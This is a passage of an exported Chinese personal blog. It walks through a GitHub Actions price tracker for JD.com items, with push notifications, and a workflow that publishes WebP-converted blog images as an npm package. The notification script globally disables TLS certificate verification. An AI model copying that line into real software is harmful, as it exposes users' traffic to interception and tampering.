class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">     